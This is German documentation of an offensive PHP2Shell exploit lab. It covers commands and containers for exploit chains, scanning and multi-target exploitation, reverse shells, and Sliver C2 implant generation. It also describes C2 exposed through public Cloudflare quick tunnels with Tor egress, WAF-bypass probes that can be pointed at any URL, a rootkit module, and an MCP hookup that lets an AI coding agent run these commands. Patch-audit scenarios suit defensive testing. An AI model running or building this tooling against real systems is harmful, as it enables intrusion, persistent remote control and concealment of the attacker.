# PHP2Shell — unchained

**By Leviticus-Triage**

Einstieg und Übersicht (EN): [../README.md](../README.md) · Dokumentationsindex: [README.md](README.md)

Dieses Dokument beschreibt den Funktionsumfang des Labs im aktuellen Stand: Befehle, Container, Netze, Umgebungsvariablen, Logs, Menü und Integrationen. Es enthält keine Bewertung der Verfahren. Ein Hinweis zur zulässigen Nutzung steht am Ende.

Kurzindex der übrigen Dateien:

| Datei | Inhalt |
|-------|--------|
| [HOWTO-DE.md](HOWTO-DE.md) | Ablauf in Phasen 1–10 |
| [WORKAROUNDS-SCHRITT-FUER-SCHRITT.md](WORKAROUNDS-SCHRITT-FUER-SCHRITT.md) | Workarounds Schritt für Schritt (1 Terminal, Log + Auswertung) |
| [PATCH-BYPASS-AUDIT.md](PATCH-BYPASS-AUDIT.md) | Patch-Audit-Szenarien |
| [SINGULARITY-LAB.md](SINGULARITY-LAB.md) | Singularity-Laufzeiten |
| [CURSOR-INTEGRATION.md](CURSOR-INTEGRATION.md) | MCP, Skill, Rule |
| [EXPLOIT-CHAIN-COMPARISON.md](EXPLOIT-CHAIN-COMPARISON.md) | Zuordnung der Exploit-Pfade |
| [../README-PORTABLE.md](../README-PORTABLE.md) | Portable-Archiv |

---

## 1. Befehle (jedes Arbeitsverzeichnis)

Die Launcher liegen in `bin/` und lösen Symlinks auf, damit das Lab-Root unabhängig vom aktuellen Ordner gefunden wird.

| Befehl | Datei | Wirkung |
|--------|--------|---------|
| `vtbw-php2shell-lab` | `bin/vtbw-php2shell-lab` | Dispatcher. Ohne Argument: Menü. |
| `php2shell-unchained` | `bin/php2shell-unchained` | Menü (`vtbw-php2shell-lab menu`). |
| `vtbw-php2shell-doctor` | `bin/vtbw-php2shell-doctor` | `vtbw-php2shell-lab doctor`. |

Installation der Symlinks:

```bash
scripts/install-commands.sh
```

Das Skript legt Symlinks an in:

- `$HOME/.local/bin/` (dieses Verzeichnis steht in der PATH dieser Installation)
- `/usr/local/bin/`, wenn das Verzeichnis schreibbar ist oder `sudo -n` ohne Passwortabfrage funktioniert

Zusätzlich werden vorhandene Launcher im Elternordner des Labs durch Symlinks auf `bin/` ersetzt.

`VTBW_LAB_WRAPPER` zeigt nach dem Start auf `bin/vtbw-php2shell-lab` (aufgelöster Pfad, nicht der Symlink-Name).

---

## 2. Baum

```
php2shell-lab-vtbw/
  bin/                  Launcher
  scripts/              Dispatcher, Fetch, Menü, Tunnel, Tor, External, Audits
  attacker/             Image + patch_audit.py
  target/               nginx + PHP-FPM Image
  target-apache/        Apache-bezogene Dateien im Baum (Compose nutzt php:8.4.26-apache)
  sliver/               Sliver-Server-Image (golang:1.24-bookworm)
  tunnel/               cloudflared-Sidecar (Tor-Route)
  tor/                  Tor SOCKS5 + TransPort
  singularity/          VM-Hinweise
  singularity-lab/      privilegiertes Build-Image
  mcp/                  MCP-Server php2shell_lab_mcp.py
  docs/
  targets/              Ziel-Listen für Scan
  .cursor/              Skill + Rule
  third_party/          nicht im Git; wird von fetch-* gefüllt
  out/                  nicht im Git; Laufzeit-Artefakte
docker-compose.yml
```

Wrapper außerhalb des Labs (Geschwisterdateien) sind nach `install-commands.sh` Symlinks auf `bin/`.

---

## 3. Laufzeitabhängigkeiten

Vorhanden sein müssen: Docker (Socket über `scripts/docker-env.sh`: bestehendes `DOCKER_HOST`, sonst `~/.docker/desktop/docker.sock`, sonst `/var/run/docker.sock`), `bash`, `curl`, `python3`. Der Attacker-Container enthält `curl`, `iproute2`, `procps`, `netcat-openbsd`, `lsof`, `chkrootkit`, `PySocks`. Das Sliver-Image enthält die Go-Toolchain 1.24. Tor- und Tunnel-Images basieren auf `alpine:3.20`.

---

## 4. Netze und Dienste

### Compose-Netze

| Netz | Treiber | `internal` | Rolle |
|------|---------|------------|--------|
| `lab_isolated` | bridge | ja | Targets, Attacker, Sliver, Singularity, Tunnel-Sidecar, Tor-Alias `tor` |
| `lab_egress` | bridge | nein | Ausgehender Verkehr: Attacker, Sliver (Go-Module), Tor (Directory/Exit), Quick-Tunnel ohne `--tor` |

### Zusätzliches Netz (nicht in Compose)

`scripts/lab-tor.sh` legt bei Bedarf `php2shell-lab-vtbw_lab_tor` an: Subnetz `10.213.37.0/24`. Feste Adresse des Tor-Containers: `10.213.37.2`. Tunnel-Sidecars im Modus `--tor`: Web `10.213.37.10`, sliver-http `10.213.37.11`. Default-Route der Sidecars: `via 10.213.37.2`.

### Dienste

| Compose-Service | Container | Profil | Host-Port | Anmerkung |
|-----------------|-----------|--------|-----------|-----------|
| `target` | `vtbw-php2shell-target` | (keins) | `127.0.0.1:19281` → 80 | PHP-FPM, Default-Image-Arg `PHP_TARGET_VERSION=8.4.4`, `read_only`, Capabilities reduziert |
| `target-apache` | `vtbw-php2shell-apache` | `apache` | `127.0.0.1:19288` → 80 | Image `php:8.4.26-apache`, `linux/amd64` |
| `target-apache-2` | `vtbw-php2shell-apache-2` | `multi` | `127.0.0.1:19289` → 80 | gleiches Image, Volume `out2` |
| `attacker` | `vtbw-php2shell-attacker` | `tools` | — | `read_only`, `/tmp` tmpfs 32m, Netze isolated + egress |
| `singularity-lab` | `vtbw-php2shell-singularity-lab` | `singularity` | — | `privileged`, `pid: host`, Host-Module read-only |
| `sliver` | `vtbw-php2shell-sliver` | `sliver` | `127.0.0.1:31337` → 31337 | Multiplayer; Volumes `out/sliver` → `/out`, `out/sliver/server-data` → `/root/.sliver` |

Container außerhalb von Compose:

| Name | Erzeugt von | Netze |
|------|-------------|--------|
| `vtbw-php2shell-tor` | `tor up` | egress, `lab_tor` (`.2`), isolated (Alias `tor`) |
| `vtbw-php2shell-tunnel` | `tunnel up web` | ohne `--tor`: isolated + egress. Mit `--tor`: isolated + `lab_tor`, kein egress |
| `vtbw-php2shell-tunnel-sliver` | `tunnel up sliver-http` | wie oben, Transit-IP `.11` |
| `vtbw-php2shell-stage` | `sliver stage` | Lab-Netz des attacker-Runs, HTTP `:18080` auf `out/sliver` |

`down` entfernt die Tunnel-, Stage- und Tor-Container, löscht `out/external/state.env` und fährt die Compose-Profile `apache`, `multi`, `singularity`, `sliver`, `tools` sowie das Default-Compose herunter.

### Target-Härtung (FPM)

`no-new-privileges`, `cap_drop: ALL`, zusätzlich `CHOWN`, `SETGID`, `SETUID`, `DAC_OVERRIDE`, `NET_BIND_SERVICE`. `read_only: true`. tmpfs: `/tmp`, PHP-Sessions, nginx-/php-fpm-Logs, `/run`, `/var/lib/nginx`. Healthcheck: `curl -sf http://127.0.0.1/index.php`.

### Tor-Prozess

`tor/torrc`: `SocksPort 0.0.0.0:9050`, `TransPort 0.0.0.0:9040`, `DNSPort 0.0.0.0:5353`. Entrypoint setzt `net.ipv4.ip_forward=1` über `docker run --sysctl` und legt auf dem `lab_tor`-Interface NAT-REDIRECT an: TCP-SYN → 9040, DNS TCP/UDP 53 → 5353. Capability `NET_ADMIN`.

### Tunnel-Prozess

Ohne `--tor`: Image `cloudflare/cloudflared:latest`, Argument `tunnel --no-autoupdate --url <ziel>`.  
Mit `--tor`: Image aus `tunnel/Dockerfile` (statisches `cloudflared-linux-amd64`), Entrypoint wartet auf die Route `default via 10.213.37.2`, DNS des Containers ist `10.213.37.2`.  
Ziel `http://target:80` (Mode `web`) bzw. `https://sliver:8889` (Mode `sliver-http`). Bei `https://`-Zielen wird `--no-tls-verify` gesetzt (Sliver-Listener-Zertifikat).  
URL-Erkennung: erste mehrteilige Subdomain `https://<wort>-<wort>….trycloudflare.com` in den Container-Logs. `api.trycloudflare.com` wird nicht als Tunnel-URL übernommen. Wartezeit bis zu 60 × 2 Sekunden. Geschriebene Dateien: `out/tunnel/web.url`, `out/tunnel/sliver-http.url`. `tunnel down` löscht die passende `.url`-Datei.

---

## 5. Menü

Skript: `scripts/php2shell-unchained-menu.sh`. Ohne TTY gibt das Menü das Help aus und startet keine Schleife.

| Taste | Titel | Unterpunkte (Auswahl ruft den Wrapper auf) |
|-------|--------|-----------------------------------------------|
| 1 | FPM-Lab | `up`, `test`, `doctor`, `rce`, `shell`, `monitor` |
| 2 | Zer061 mod_php | `apache-up`, `fetch-zer061`, `zer061`, `zer061-shell` |
| 3 | Jackalsyn | `fetch-jackalsyn`, `jackalsyn status`, `selftest`, `syms`, `lab` |
| 4 | Multi-Target | `apache-multi-up`, `scan`, `fingerprint`, `exploit-list` |
| 5 | Reverse Shell | `fetch-reverse-shell`, `reverse-shell fetch`, `listen`, `zer061` |
| 6 | Sliver C2 + External | `external up`, `external up --tor`, `external status`, `external down`, `tor ip`, `sliver implant-external`, `external patch-audit waf-bypass-top10`, danach Sliver- und Tunnel-Einzelbefehle |
| 7 | Singularity | `fetch-singularity`, `status`, `runtime`, Container/Host/VM-Befehle, `detect` |
| 8 | Workarounds+Audit | zuerst `workarounds run|auto|last`, darunter Einzelchecks `patch-audit list|run|logs` |
| 9 | Kit Docs & Tools | `docs list`, `tools list`, `tools` |
| d | Docker | `ps`, `logs` target/apache/singularity/sliver/tor/tunnel-sliver, `tunnel status`, `external status`, `down`, `export` |
| h | Hilfe | `help` |
| 0 | Beenden | — |

Menü-Specs mit `|` werden in Umgebungszuweisungen und Argumente zerlegt (`PATCH_AUDIT_DESTRUCTIVE=1|patch-audit|run|…`).

---

## 6. Dispatcher

`scripts/lab-dispatch.sh`, aufgerufen vom Launcher. Befehlsnamen werden in Kleinbuchstaben gewandelt.

| Befehl | Skript / Wirkung |
|--------|------------------|
| `up` | `lab-up.sh` |
| `test` | `lab-test.sh` |
| `monitor` | `lab-monitored-run.sh` |
| `doctor` | `lab-doctor.sh` |
| `rce` | `lab-rce.sh test` |
| `shell` | `lab-rce.sh shell` |
| `jackalsyn [sub]` | `lab-jackalsyn.sh` (Default `status`) |
| `apache-up` | `lab-apache-up.sh` |
| `apache-multi-up` | `lab-apache-multi-up.sh` |
| `fetch-zer061` | Klont `ZER061_REPO` (Default `https://github.com/Zer061/CVE-2026-109618.git`) nach `third_party/` |
| `fetch-jackalsyn` | Framework `JACKALSYN_FW_REPO` (Default `https://github.com/cereZ23/php-up-2026.git`) plus Reup-Zip |
| `fetch-singularity` | `SINGULARITY_REPO` (Default `https://github.com/MatheuZSecurity/Singularity.git`) |
| `fetch-sliver` | GitHub-Release BishopFox/sliver, `SLIVER_VERSION` Default `latest`, Asset `sliver-server_linux-<arch>` und `sliver-client_linux-<arch>` |
| `fetch-reverse-shell` | `REVERSE_SHELL_REPO` (Default `https://github.com/lukechilds/reverse-shell.git`) |
| `sliver [sub…]` | `lab-sliver.sh` |
| `tunnel [sub…]` | `lab-tunnel.sh` |
| `tor [sub…]` | `lab-tor.sh` |
| `external [sub…]` | `lab-external.sh` |
| `singularity [sub]` | `lab-singularity.sh` |
| `patch-audit` / `mitigation-audit` / `audit-patch` | `lab-patch-audit.sh` |
| `workarounds` / `wa` / `workaround-guide` | `lab-workarounds.sh` |
| `zer061` | `lab-zer061.sh` |
| `zer061-shell` / `zer061shell` / `revshell-apache` | `lab-zer061-shell.sh` |
| `scan` | `lab-zer061-scan.sh` |
| `exploit-list` / `exploit-multi` | `lab-zer061-exploit-list.sh` |
| `fingerprint` / `scan-only` | dasselbe mit `--scan-only` |
| `docs` | `lab-zer061-docs.sh` |
| `tools` | `lab-zer061-tools.sh` |
| `reverse-shell` / `revshell` | `lab-reverse-shell.sh` |
| `export` / `archive` | `make-export-archive.sh` |
| `menu` / `unchained` | Menü |
| `ps` | `docker ps --filter name=vtbw-php2shell` |
| `logs <ziel>` | `docker logs -f` für target, apache, singularity, sliver, tunnel, tunnel-sliver, tor |
| `down` | siehe Abschnitt 4 |
| `help` | `lab-help.sh` |

Unbekannte Namen enden mit Exit 2.

### FPM-Pfad

`up` startet den Service `target`. `test` führt den UAF-PoC aus (0x4148), ohne die Chain-A-Shell. `rce` ruft `lab-rce.sh test` auf, `shell` ruft `lab-rce.sh shell` auf (Chain A: FPM plus LFI im Lab-Target). `doctor` prüft den Lab-Zustand. `monitor` startet `lab-monitored-run.sh`.

Host-URL des FPM-Targets, wenn das Port-Mapping steht: `http://127.0.0.1:19281/index.php`. Im Attacker-Container ist dieselbe Funktion über `http://target/index.php` erreichbar. `lab-patch-audit.sh` mappt `127.0.0.1:19281` und `localhost:19281` auf `http://target/index.php`, Port 19288 auf `http://target-apache/index.php`, Port 19289 auf `http://target-apache-2/index.php`.

### Zer061

`apache-up` startet Profil `apache`. `zer061` und `zer061-shell` laufen gegen dieses Target. Schreibräume: `third_party/zer061-php2shell/out` (Host und Apache-Mount `/out`, Attacker-Mount dieselbe Stelle). Zweites Target (`multi`): `out2`.

### Jackalsyn

Subcommands laut `lab-jackalsyn.sh` / Menü: `status`, `selftest`, `syms`, `lab`, `help`, `paths`. MCP-Whitelist zusätzlich: `selftest`, `syms`, `lab`, `status`, `help`, `paths`.

### Scan

`scan` akzeptiert eine optionale Zieldatei. `DEEP=1` wird im Help als Schalter für `--deep` genannt. `exploit-list` akzeptiert `-t` / `THREADS`. `fingerprint` ist `exploit-list --scan-only`.

### Reverse Shell

`reverse-shell fetch` schreibt ein Payload nach `out/r`. `reverse-shell listen` startet einen `nc`-Listener. `reverse-shell zer061` koppelt das lukechilds-Payload an den Zer061-Lauf. Der Kit-Weg `zer061-shell` ist ein anderer Befehl.

---

## 7. Sliver

Skript `scripts/lab-sliver.sh`. Binaries nach `fetch-sliver` unter `third_party/sliver/` (`sliver-server`, `sliver-client`), im Image nach `/opt/sliver/`.

| Subcommand | Wirkung |
|------------|---------|
| `status` / `help` | Banner, Binary-Check, Daemon-Status, Befehlsliste |
| `server-up` | `docker compose --profile sliver build/up`. Wartet bis zu 60 × 2 s, bis `sliver-client --config` eine `sessions`-Abfrage beantwortet, sofern eine Operator-Config existiert |
| `operator` | Legt Operator `lab` an (`--lhost 127.0.0.1 --permissions all --save /out/`), Dateiname `lab_<lhost>.cfg`. Existiert eine Config und `sessions` gelingt, wird sie behalten. Sonst werden `lab_*.cfg` gelöscht und neu erzeugt, danach `sliver-client import` |
| `listener` | rc: `mtls --lhost 0.0.0.0 --lport 8888`, danach `jobs` |
| `http-listener` | rc: `https --lhost 0.0.0.0 --lport 8889`, danach `jobs` |
| `implant` | `generate --mtls sliver:8888 --os linux --arch amd64 --format executable --save /out/implant` |
| `implant-external` | Liest `out/tunnel/sliver-http.url`, Hostname ohne Schema. `generate --http https://<host> --os linux --arch amd64 --format executable --save /out/implant-external` |
| `stage` | `docker compose --profile tools run -d --name vtbw-php2shell-stage` mit `python3 -m http.server 18080` auf `out/sliver`. Gibt einen curl-One-Liner für die FPM-Shell aus |
| `console` | `docker exec -it` interaktiver Client |
| `ops` | letzte 50 Zeilen `out/sliver/ops.log` |
| `down` | `docker compose --profile sliver down` |

rc-Läufe schreiben `out/sliver/rc-<name>.rc` und rufen `sliver-client --config /out/<cfg> --rc …` auf. Enthält die Ausgabe `rc line N:` oder `root command: rc:`, endet das Skript mit Fehler. Der Multiplayer-Port im Container ist 31337, auf dem Host nur an `127.0.0.1` gebunden. Server-Zustand (Datenbank, CAs, Logs) liegt in `out/sliver/server-data` (`/root/.sliver`). `SLIVER_ROOT` im Image ist `/opt/sliver/data`; der Daemon schreibt den persistierten Zustand nach `/root/.sliver`.

mTLS `:8888` ist eine Listener-Adresse im Lab-Netz (`sliver:8888`). Der externe HTTPS-Pfad im Tool ist Listener `:8889` plus Quick Tunnel Mode `sliver-http` (Edge-Port 443 der trycloudflare-URL → cloudflared → `https://sliver:8889`).

---

## 8. Tor

| Subcommand | Wirkung |
|------------|---------|
| `up` | Netz anlegen, Image `vtbw-php2shell-tor` bauen, Container starten, Bootstrap-Schleife bis Logzeile `Bootstrapped 100%` (max. 90 × 2 s) |
| `ip` | Host-IP via `curl https://api.ipify.org` und Exit-IP via kurzlebigem `curlimages/curl` im Netz `lab_isolated` mit `--socks5-hostname vtbw-php2shell-tor:9050`. Schreibt `ip-check ok` oder `ip-check warn` nach `out/tor/ops.log` |
| `status` / `help` | Laufzustand, letzte Bootstrap-Zeile, Subcommands |
| `log` | `docker logs -f` |
| `down` | Container entfernen. `down --net` entfernt zusätzlich das Netz `php2shell-lab-vtbw_lab_tor` |

SOCKS aus dem isolated-Netz: `vtbw-php2shell-tor:9050` bzw. Alias `tor`.

---

## 9. Tunnel

| Subcommand | Argumente | Wirkung |
|------------|-----------|---------|
| `up` | `web` oder `sliver-http`, optional `--tor` | Container starten, URL nach `out/tunnel/<mode>.url` |
| `url` | Mode, Default `web` | Inhalt der `.url`-Datei oder Hinweistext |
| `down` | Mode oder `all` (Default) | Container und `.url` entfernen |
| `status` / `help` | — | Laufzustand beider Modes |

Ops-Zeile: `tunnel-up mode=… tor=0|1 url=…` in `out/tunnel/ops.log` (UTC).

---

## 10. External

`scripts/lab-external.sh` schreibt `out/external/ops.log` und bei `up` die Datei `out/external/state.env`:

```
EXTERNAL_MODE=1
EXTERNAL_TOR=0|1
EXTERNAL_WEB_URL=https://….trycloudflare.com
EXTERNAL_SLIVER_URL=https://….trycloudflare.com
EXTERNAL_TS=<UTC>
```

| Subcommand | Wirkung |
|------------|---------|
| `up [--tor]` | Optional `tor up`, dann `tunnel up web`, `tunnel up sliver-http` (mit `--tor`, wenn gesetzt). Enthält die sliver-URL `api.trycloudflare.com`, Abbruch. Wenn Sliver-Container läuft und `out/sliver/lab_*.cfg` existiert: `sliver http-listener`. Danach `tor ip` nur bei `--tor` |
| `status` | state.env, Tunnel-Status, Auszug Tor-Status |
| `url [web\|sliver-http]` | Tunnel-URL |
| `env` | drei `export`-Zeilen: `LAB_TARGET_URL`, `PATCH_AUDIT_URL=<web>/index.php`, `PATCH_AUDIT_PROXY` (`socks5h://vtbw-php2shell-tor:9050` wenn `EXTERNAL_TOR=1`, sonst leer) |
| `patch-audit <id\|all>` | setzt `PATCH_AUDIT_URL` und bei Tor `PATCH_AUDIT_PROXY`, ruft `lab-patch-audit.sh run` |
| `down [--tor]` | `tunnel down all`, bei `--tor` auch `tor down`, löscht `state.env` |

Verkehr, den diese Befehle erzeugen:

- `external up` ohne `--tor`: cloudflared hat `lab_egress`. Der TCP-Aufbau zur Cloudflare-API geht vom Tunnel-Container direkt ins Internet. HTTP(S) zur trycloudflare-URL kommt an der Cloudflare-Edge an und wird zum Origin im Lab weitergereicht (`target:80` oder `sliver:8889`).
- `external up --tor`: Tunnel-Container ohne `lab_egress`. Dessen Default-Route zeigt auf den Tor-TransPort. Attacker-Audits mit gesetztem `PATCH_AUDIT_PROXY` nutzen SOCKS5 mit Remote-DNS (`socks5h`).
- Menüpunkte 1–5, `sliver listener` (mTLS) und `sliver implant` (Ziel `sliver:8888`) verwenden die Lab-Netze bzw. Host-Ports und nicht den Quick Tunnel, solange die aufgerufenen Skripte keine Tunnel-URL übergeben bekommen.
- `sliver implant-external` trägt die sliver-http-Tunnel-URL als C2 ein (`--http https://<host>`).

---

## 11. Workarounds (geführt) + Patch-Audit

`workarounds` (`scripts/lab-workarounds.sh`, Menü [8] erster Eintrag) führt in fester Reihenfolge durch alle Audit-Szenarien: Änderungstext anzeigen → Nutzer wendet sie an → ENTER → `patch-audit run <id>` → Log → Abschluss-Auswertung. Der ganze Ablauf braucht nur Terminal 1; Terminal 2 ist bei keinem Schritt Pflicht (nur optionale Live-Logs).

| Befehl | Wirkung |
|---|---|
| `workarounds` / `guide` / `list` | Übersicht: Schritte, Reihenfolge, Terminal-Angabe |
| `workarounds run [id…]` | Geführt mit ENTER pro Schritt (ohne ID: alle 11) |
| `workarounds auto [id…]` | Ohne Rückfragen, Baseline-Messung |
| `workarounds last` | `auswertung.md` der letzten Sitzung |
| `workarounds logs` | Sitzungen auflisten |

Jede Sitzung schreibt `out/workarounds/<UTC-Zeit>/` mit `session.log` (Bildschirm-Mitschnitt), `steps.jsonl`, `step-NN-<id>.log` und `auswertung.md` (OK/OFFEN/PRÜFEN/INFO + Nachjustieren). Anleitung: [WORKAROUNDS-SCHRITT-FUER-SCHRITT.md](WORKAROUNDS-SCHRITT-FUER-SCHRITT.md).

Darunter liegt die Einzelprüfung:

## 11a. Patch-Audit

`scripts/lab-patch-audit.sh` startet `docker compose --profile tools run --rm attacker python3 /opt/lab/scripts/patch_audit.py`.

| Subcommand | Wirkung |
|------------|---------|
| `list` | Szenarien mit Titel, Mitigation-Text und Bypass-Text aus `SCENARIOS` |
| `run <id>…` oder `run all` | Checks ausführen |
| `logs [N]` | letzte N Zeilen `out/audit/patch-audit.jsonl` (Default 50) |

Umgebungsvariablen, die in den Container durchgereicht werden:

| Variable | Verwendung |
|----------|------------|
| `PATCH_AUDIT_URL` | Ziel. Leer/Default im Skript: `http://target/index.php`. Endet die URL nicht auf `.php`, wird `/index.php` angehängt |
| `PATCH_AUDIT_APACHE_URL` | Default-Mapping `http://target-apache/index.php` |
| `PATCH_AUDIT_DESTRUCTIVE` | gesetzt (Menü: `1`) schaltet den UAF-Probe für `upload-progress-off` frei |
| `PATCH_AUDIT_PROXY` | `socks5h://host:port`, `socks5://`, `socks4…` oder `http(s)://`. SOCKS über PySocks (`socket.socket`-Ersatz, `rdns` bei Schema `socks5h`). HTTP(S)-Proxy über `http_proxy`/`https_proxy` |
| `PATCH_AUDIT_LOG` | Default im Container `/opt/lab/out/audit/patch-audit.jsonl` (Bind-Mount `./out`) |

JSONL-Felder pro Lauf: `scenario`, `status`, `detail` (gekürzt auf 400 Zeichen), `target`, `proxy` (`none`, wenn kein Proxy aktiv ist).

Statuswerte der Result-Zeile: `PASS`, `FAIL`, `WARN`, `SKIP`, `INFO`. Exit-Code 1, wenn mindestens ein `FAIL` vorkommt.

Szenario-IDs:

| ID | Titel im Code |
|----|----------------|
| `vendor-patch` | Vendor PHP patch (CVE-2026-109618/619) |
| `upload-progress-off` | session.upload_progress.enabled=Off |
| `waf-php2shell-signature` | WAF PHP2Shell body rule (AWS 2.4+) |
| `memory-limit-workaround` | Raised memory_limit only |
| `ini-set-late` | ini_set upload_progress in app |
| `edge-multipart-block` | Edge blocks all multipart |
| `chain-a-lfi` | LFI / Chain A closed |
| `zer061-heap` | Zer061 heap (mod_php 8.4.26) |
| `cve-115560-config` | CVE-2026-115560 residual |
| `singularity-detect` | Rootkit / LKM detection |
| `waf-bypass-top10` | Top-10 WAF bypass probes |

`waf-bypass-top10` sendet zehn POST-Proben und zählt HTTP-Ergebnisse als `BYPASSED`, `UNCLEAR` oder blockiert. Die Proben im Code:

| ID | Name | Technik-String |
|----|------|----------------|
| 01 | Lowercase field | case-mutation des Feldnamens |
| 02 | Mixed case | gemischte Groß-/Kleinschreibung |
| 03 | URL-encoded name | `%50` im Namen |
| 04 | Double encoding | `%2550` |
| 05 | Boundary mit Semikolon | zwei `boundary=`-Parameter |
| 06 | Boundary ohne Quotes + Tab | Tab/Whitespace in Content-Disposition |
| 07 | Chunked Transfer | `Transfer-Encoding: chunked` |
| 08 | Parameter Pollution | zwei Felder, Marker im zweiten |
| 09 | Inline-Kommentar | `/**/` im Namen |
| 10 | Content-Type Mutation | `multipart/related` |

Die im Szenario hinterlegten Texte nennen die Versionsstände `8.4.27+`, `8.3.36+`, `8.2.35+`, `8.5.12+` für `vendor-patch` und `PHP 8.4.27+` auf mod_php für `zer061-heap`. Das FPM-Lab-Image ist per Default `8.4.4`, das Apache-Lab-Image `8.4.26`.

Gegen ein anderes HTTP-Ziel zeigt das Skript dieselbe Prüfung, wenn `PATCH_AUDIT_URL` gesetzt ist. Host-Loopback-URLs der drei Lab-Ports werden vor dem Container-Lauf umgeschrieben (Abschnitt 6).

---

## 12. Singularity

Nicht Teil der PHP-Target-Container. Compose-Profil `singularity` startet nicht mit `up`.

| Subcommand | Wirkung |
|------------|---------|
| `fetch` | Bundle nach `third_party/singularity` |
| `status` / `help` | Bundle-Status, gespeicherte Laufzeit |
| `paths` | Bundle-, State- und Runtime-Pfade |
| `runtime` | interaktiv `container`, `host` oder `vm`, oder nicht-interaktiv über `SINGULARITY_RUNTIME` |
| `container-up` / `container-build` / `container-shell` | `lab-singularity-container.sh`. Build verlangt `CONFIRM_SINGULARITY_CONTAINER=I_UNDERSTAND_REBOOT` |
| `host-check` / `host-build` | `lab-singularity-host.sh`. Build verlangt `CONFIRM_SINGULARITY_HOST=I_UNDERSTAND_REBOOT` |
| `vm-wizard` / `vm-up` | `lab-singularity-vm.sh` (VM-Text / Stub) |
| `detect` | `lab-singularity-detect.sh`. `SINGULARITY_DETECT_TARGET=all` ist im Help von SINGULARITY-LAB genannt |

Headers-Mount: `${SINGULARITY_HEADERS:-/usr/src/linux-headers-none}` → `/usr/src/linux-headers-host` (read-only). `/lib/modules` read-only. Container: `privileged`, `pid: host`, nur Netz `lab_isolated`.

---

## 13. Export und Cursor

`export` / `archive` (`make-export-archive.sh`) schreibt ein tar.gz und legt darin eigene Kopien von `vtbw-php2shell-lab`, `php2shell-unchained` und `vtbw-php2shell-doctor` ab.

`scripts/install-cursor-mcp.sh` trägt in `~/.cursor/mcp.json` den Server `php2shell-unchained` ein:

- Befehl: `python3`
- Argument: `mcp/php2shell_lab_mcp.py`
- Env: `PHP2SHELL_LAB_ROOT`, `VTBW_LAB_WRAPPER`

MCP-Tools:

| Tool | Parameter | Wirkung |
|------|-----------|---------|
| `lab_help` | — | Wrapper `help` |
| `lab_status` | — | Wrapper `ps` |
| `lab_run` | `command`, `subcommand`, `extra` | Whitelist-Dispatch. `external`: extra `--tor` oder Szenario. `tunnel`: extra Mode. `patch-audit`: extra Szenario; `upload-progress-off` setzt `PATCH_AUDIT_DESTRUCTIVE=1`. Timeouts 30–900 s, Ausgabe auf 120000 Zeichen gekürzt |
| `lab_read_doc` | `doc` | `HOWTO-DE`, `EXPLOIT-CHAIN`, `README`, `PORTABLE`, `CURSOR`, `SINGULARITY`, `PATCH-AUDIT` (Auszug 80000 Zeichen) |
| `lab_exploit_map` | — | Help plus feste Kurzmap im MCP-Quelltext |

Skill: `.cursor/skills/php2shell-unchained/SKILL.md`. Rule: `.cursor/rules/php2shell-unchained.mdc` (`globs: php2shell-lab-vtbw/**`, `alwaysApply: false`).

---

## 14. Logs und Dateien unter `out/`

`out/` steht in `.gitignore`.

| Pfad | Inhalt |
|------|--------|
| `out/tunnel/ops.log` | UTC-Zeilen `tunnel-up` / `tunnel-down` |
| `out/tunnel/web.url`, `sliver-http.url` | aktuelle Quick-Tunnel-URL, bis `tunnel down` |
| `out/tor/ops.log` | `up`, `ip-check`, `down` |
| `out/external/ops.log` | `up`, `patch-audit`, `down` |
| `out/external/state.env` | letzte `external up` Sitzung, bis `external down` oder `down` |
| `out/sliver/ops.log` | Sliver-Operationen |
| `out/sliver/lab_*.cfg` | Operator-Config (Token, Zertifikat, privater Schlüssel) |
| `out/sliver/rc-*.rc` | zuletzt geschriebene Client-rc-Dateien |
| `out/sliver/implant`, `implant-external`, `implant-debug` | generierte ELF-Dateien |
| `out/sliver/server-data/` | Sliver-Daemon-Zustand (`/root/.sliver`) |
| `out/audit/patch-audit.jsonl` | Audit-JSONL |
| `out/r` | Reverse-Shell-Payload aus `reverse-shell fetch` |

`.gitignore` schließt außerdem aus: `.env`, `logs/`, `third_party/` (Exploit-Bundles, Sliver-Binaries, Singularity-Quellen, Zip/Tar dort).

---

## 15. Weitere Umgebungsvariablen

| Variable | Ort |
|----------|-----|
| `PHP_TARGET_VERSION` | Build-Arg des FPM-Targets, Default `8.4.4` |
| `DOCKER_HOST` | gesetzt durch `docker-env.sh`, wenn der Default-Socket nicht antwortet |
| `SLIVER_VERSION` | `fetch-sliver.sh`, Default `latest` |
| `SLIVER_ARCH` | aus `uname -m`: `amd64` oder `arm64` |
| `ZER061_REPO`, `JACKALSYN_FW_REPO`, `SINGULARITY_REPO`, `REVERSE_SHELL_REPO` | Fetch-URLs |
| `DEEP`, `THREADS` | Scan / Exploit-Liste |
| `LAB` | von den Lab-Skripten auf das Repo-Root gesetzt |
| `TOR_NET_PREFIX` | Tor-Entrypoint, Default `10.213.37.` |
| `TOR_GW`, `TARGET_URL`, `TLS_FLAG` | Tunnel-Sidecar |

---

## 16. Disclaimer

Dieses Repository beschreibt und enthält Steuerungscode für ein isoliertes Labor zu PHP2Shell (CVE-2026-109618, CVE-2026-109619, im Audit-Text außerdem CVE-2026-115560), einschließlich Exploit-Orchestrierung, C2 (Sliver), eines Cloudflare Quick Tunnels, eines Tor-Egress und eines LKM-Research-Pfads (Singularity). Die Drittanbieter-Bundles werden zur Laufzeit heruntergeladen und sind nicht Teil des Git-Baums.

Nutzung ist nur an Systemen zulässig, für die eine ausdrückliche Erlaubnis der zuständigen Stelle vorliegt (eigenes Labor, schriftlich beauftragter Test). Unbefugtes Anwenden gegen fremde Systeme, Umgehen von Schutzmaßnahmen ohne Auftrag und das Verbreiten der erzeugten Implants außerhalb eines solchen Auftrags können strafbar sein. Der Autor übernimmt keine Haftung für den Einsatz. Quick-Tunnel-URLs sind öffentlich erreichbare Namen der Form `*.trycloudflare.com`, solange der Tunnel-Container läuft. Operator-Configs, Implants und `out/` dürfen nicht veröffentlicht werden.
